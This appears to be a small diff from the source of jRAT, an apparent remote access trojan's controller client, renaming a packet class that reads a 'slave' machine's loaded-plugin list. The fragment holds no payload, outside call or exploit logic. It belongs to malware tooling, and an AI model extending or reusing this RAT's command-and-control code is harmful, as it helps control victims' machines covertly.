@@ -7,7 +7,7 @@ import se.jrat.client.ui.frames.FrameControlPanel;
 import se.jrat.client.ui.panels.PanelControlLoadedPlugins;
 
 
-public class Packet67LoadedPlugins extends AbstractIncomingPacket {
+public class Packet16LoadedPlugins extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
